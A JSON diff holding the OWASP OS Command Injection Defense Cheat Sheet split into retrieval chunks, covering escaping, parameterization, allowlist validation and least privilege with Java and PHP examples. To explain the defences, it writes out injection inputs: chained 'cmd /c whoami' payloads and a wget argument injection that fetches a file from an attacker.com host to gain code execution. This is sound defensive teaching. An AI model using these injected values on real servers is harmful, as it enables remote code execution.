@@ -1,0 +1,105 @@
+{
+ "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+ "title": "OS Command Injection Defense Cheat Sheet",
+ "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+ "chunks": [
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#001",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Introduction",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "Command injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command.\n\nFor example, if the supplied value is:\n\n```\ncalc\n```\n\nwhen typed in a Windows command prompt, the application Calculator is displayed.\n\nHowever, if the supplied value has been tampered with, and now it is:\n\n```\ncalc & echo \"test\"\n```\n\nwhen executed, it changes the meaning of the initial intended value.\n\nNow, both the Calculator application and the value test are displayed:\n\nThe problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage."
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#002",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Introduction > Argument Injection",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "Every OS Command Injection is also an Argument Injection. In this type of attacks, user input can be passed as arguments while executing a specific command.\n\nFor example, if the user input is passed through an escape function to escape certain characters like &, |, ;, etc.\n\n```\nsystem(\"curl \" . escape($url));\n```\n\nwhich will prevent an attacker to run other commands.\n\nHowever, if the attacker controlled string contains an additional argument of the curl command:\n\n```\nsystem(\"curl \" . escape(\"--help\"))\n```\n\nNow when the above code is executed, it will show the output of curl --help.\n\nDepending upon the system command used, the impact of an Argument injection attack can range from Information Disclosure to critical Remote Code Execution."
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#003",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Primary Defenses > Defense Option 1: Avoid calling OS commands directly",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "The primary defense is to avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do.\n\nFor example use mkdir() instead of system(\"mkdir /dir_name\").\n\nIf there are available libraries or APIs for the language you use, this is the preferred method."
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#004",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Primary Defenses > Defense option 2: Escape values added to OS commands specific to each OS",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "For examples, see escapeshellarg() in PHP.\n\nThe escapeshellarg() surrounds the user input in single quotes, so if the malformed user input is something like & echo \"hello\", the final output will be like calc '& echo \"hello\"' which will be parsed as a single argument to the command calc.\n\nEven though escapeshellarg() prevents OS Command Injection, an attacker can still pass a single argument to the command."
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#005",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Primary Defenses > Defense option 3: Parameterization in conjunction with Input Validation",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "If calling a system command that incorporates user-supplied cannot be avoided, the following two layers of defense should be used within software to prevent attacks:"
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#006",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Primary Defenses > Defense option 3: Parameterization in conjunction with Input Validation > Layer 1",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "Parameterization: If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help provide the relevant quoting and encoding."
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#007",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Primary Defenses > Defense option 3: Parameterization in conjunction with Input Validation > Layer 2",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "Input validation: The values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments:\n\nWhen it comes to the commands used, these must be validated against a list of allowed commands.\n\nIn regards to the arguments used for these commands, they should be validated using the following options:\n\nPositive or allowlist input validation: Where are the arguments allowed explicitly defined.\n\nAllowlist Regular Expression: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in Note A and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: ^[a-z0-9]{3,10}$\n\nFor commands that support it, use -- to end option parsing. In curl, later arguments are still URL operands: -- does not prevent additional transfers. Pass exactly one validated URL as one argument using a process API, and disable curl's URL globbing with --globoff. Do not interpolate an unquoted value into a shell command. Argument separation does not validate the destination; apply SSRF protections.\n\nNote A:\n\n```\n& |  ; $ > < ` \\ ! ' \" ( )\n```"
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#008",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Additional Defenses",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "On top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth.\n\nThese additional defenses are:\n\nApplications should run using the lowest privileges that are required to accomplish the necessary tasks.\n\nIf possible, create isolated accounts with limited privileges that are only used for a single task."
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#009",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Code examples > Java",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "In Java, use ProcessBuilder and the command must be separated from its arguments.\n\nNote about the Java's Runtime.exec method behavior:\n\nThere are many sites that will tell you that Java's Runtime.exec is exactly the same as C's system function. This is not true. Both allow you to invoke a new program/process.\n\nHowever, C's system function passes its arguments to the shell (/bin/sh) to be parsed, whereas Runtime.exec tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters.\n\nRuntime.exec does NOT try to invoke the shell at any point and does not support shell metacharacters.\n\nThe key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using &, &&, |, ||, etc, redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter.\n\nCode to test the note above:"
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#010",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Code examples > Java",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "```\nString[] specialChars = new String[]{\"&\", \"&&\", \"|\", \"||\"};\nString payload = \"cmd /c whoami\";\nString cmdTemplate = \"java -version %s \" + payload;\nString cmd;\nProcess p;\nint returnCode;\nfor (String specialChar : specialChars) {\n    cmd = String.format(cmdTemplate, specialChar);\n    System.out.printf(\"#### TEST CMD: %s\\n\", cmd);\n    p = Runtime.getRuntime().exec(cmd);\n    returnCode = p.waitFor();\n    System.out.printf(\"RC    : %s\\n\", returnCode);\n    System.out.printf(\"OUT   :\\n%s\\n\", IOUtils.toString(p.getInputStream(),\n                      \"utf-8\"));\n    System.out.printf(\"ERROR :\\n%s\\n\", IOUtils.toString(p.getErrorStream(),\n                      \"utf-8\"));\n}\nSystem.out.printf(\"#### TEST PAYLOAD ONLY: %s\\n\", payload);\np = Runtime.getRuntime().exec(payload);\nreturnCode = p.waitFor();\nSystem.out.printf(\"RC    : %s\\n\", returnCode);\nSystem.out.printf(\"OUT   :\\n%s\\n\", IOUtils.toString(p.getInputStream(),\n                  \"utf-8\"));\nSystem.out.printf(\"ERROR :\\n%s\\n\", IOUtils.toString(p.getErrorStream(),\n                  \"utf-8\"));\n```\n\nResult of the test:\n\n```\n##### TEST CMD: java -version & cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version && cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version | cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version || cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST PAYLOAD ONLY: cmd /c whoami\nRC    : 0\nOUT   :\nmydomain\\simpleuser\n\nERROR :\n```\n\nIncorrect usage:\n\n```\nProcessBuilder b = new ProcessBuilder(\"C:\\\\DoStuff.exe -arg1 -arg2\");\n```\n\nThis creates a builder with one command-list element, not a program followed by two arguments. ProcessBuilder represents the executable and its arguments as a list. The snippet does not start a process or demonstrate shell-command injection.\n\nCorrect Usage:"
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#011",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Code examples > Java",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "This illustrative example starts a process with a modified working directory and passes the executable and each argument separately. Keep the executable and working directory trusted, and validate any untrusted arguments for the invoked program. Argument separation does not replace argument validation.\n\n```\nProcessBuilder pb = new ProcessBuilder(\"TrustedCmd\", \"TrustedArg1\", \"TrustedArg2\");\n\nMap<String, String> env = pb.environment();\n\npb.directory(new File(\"TrustedDir\"));\n\nProcess p = pb.start();\n```"
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#012",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Code examples > .Net",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "See relevant details in the DotNet Security Cheat Sheet"
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#013",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "Code examples > PHP",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "PHP exposes two helper functions when you must pass user input to a shell: escapeshellarg() and escapeshellcmd().\n\nescapeshellarg(): Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.\n\nescapeshellcmd(): Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.\n\nIt is always preferable to use escapeshellarg() rather than escapeshellcmd() when dealing with user input.\n\nFor example, consider this code using wget with escapeshellcmd():\n\n```\n$url = $_GET['url'];\n$command = 'wget --directory-prefix=..\\temp ' . $url;\nsystem(escapeshellcmd($command));\n```\n\nIf the user provides:\n\n```\nhttp://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php\n```\n\nescapeshellcmd() will still allow this extra parameter meaning the attacker can override the original --directory-prefix option, save the file in the current directory and then achieve remote command execution on the server.\n\nThe safe approach is to use escapeshellarg() so that the URL is treated as a single argument:\n\n```\n$url = $_GET['url'];\n$command = 'wget --directory-prefix=..\\temp ' . escapeshellarg($url);\nsystem($command);\n```\n\nNow the malicious input becomes:\n\n```\nwget --directory-prefix=..\\temp '--directory-prefix=. http://attacker.com/malicious.php'\n```\n\nHere, the second --directory-prefix is part of the quoted string, not a real option, so the attack fails.\n\nIn addition, it is good security practice to follow these recommendations:\n\nHardcode the command: never allow the user to choose which executable to run.\n\nHardcode options: required flags (e.g., --directory-prefix) should be in the code, not in user input.\n\nValidate and restrict input as much as possible: apply strict validation rules, whitelists, and format checks to minimize the attack surface."
+  },
+  {
+   "chunk_id": "OS_Command_Injection_Defense_Cheat_Sheet#014",
+   "doc": "OS_Command_Injection_Defense_Cheat_Sheet",
+   "section": "References",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+   "text": "SEI CERT C: Do not call system()\n\nCWE-77: Command Injection"
+  }
+ ]
+}
